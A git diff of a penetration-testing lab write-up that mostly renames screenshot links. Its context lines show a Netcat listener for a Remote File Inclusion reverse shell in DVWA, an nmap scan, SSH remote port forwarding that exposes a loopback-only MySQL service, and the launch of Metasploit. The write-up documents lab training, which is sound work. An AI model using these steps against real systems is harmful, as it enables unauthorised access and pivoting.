@@ -76,10 +76,10 @@ nc -lvp 1212
 ```
 
 - In the DVWA File Inclusion module, provide the URL of the remotely hosted file.
-- 
-- ![Page 1](img-01.jpeg)
+  
+- ![Screenshot 5](images/img-01.png)
 - Check the Netcat listener to verify whether the connection is received.
-- ![Page 1](img-02.jpeg)
+- ![Screenshot 5](images/img-02.png)
 
 ### Conclusion
 
@@ -98,36 +98,36 @@ Successfully demonstrated the Remote File Inclusion (RFI) vulnerability in DVWA 
 ```bash
 sudo nmap 192.168.0.117
 ```
-- ![Page 1](img-03.jpeg)
+- ![Screenshot 5](images/img-03.png)
 
 - I connected to the target machine through SSH using the available credentials.
 
 ```bash
 ssh <username>@192.168.0.117
 ```
-- ![Page 1](img-04.jpeg)
+- ![Screenshot 5](images/img-04.png)
 
 - I checked the network services running on the target machine and identified that MySQL was listening on the loopback address (`127.0.0.1`) on port `3306`.
 
 ```bash
 netstat -tuln
 ```
-- ![Page 1](img-05.jpeg)
+- ![Screenshot 5](images/img-05.png)
 - I used SSH remote port forwarding to forward the MySQL service from the target machine to my Kali Linux machine.
 
 ```bash
 ssh -R 192.168.0.114:3306:127.0.0.1:3306 kali@192.168.0.114
 ```
-- ![Page 1](img-06.jpeg)
+- ![Screenshot 5](images/img-06.png)
 - I verified that the MySQL port was successfully forwarded to Kali Linux.
 
 ```bash
 netstat -tuln
 ```
-- ![Page 1](img-07.jpeg)
+- ![Screenshot 5](images/img-07.png)
 
 - Using the forwarded port 3306, I connected to the MySQL service and executed the required SQL commands to demonstrate the impact of the misconfiguration.
-- ![Page 1](img-08.jpeg)
+- ![Screenshot 5](images/img-08.png)
 - I checked whether the access was successful.
 - ![Page 1](img-09.jpeg)
 - Finally, I started the Metasploit Framework (`msfconsole`) to continue the access verification process.
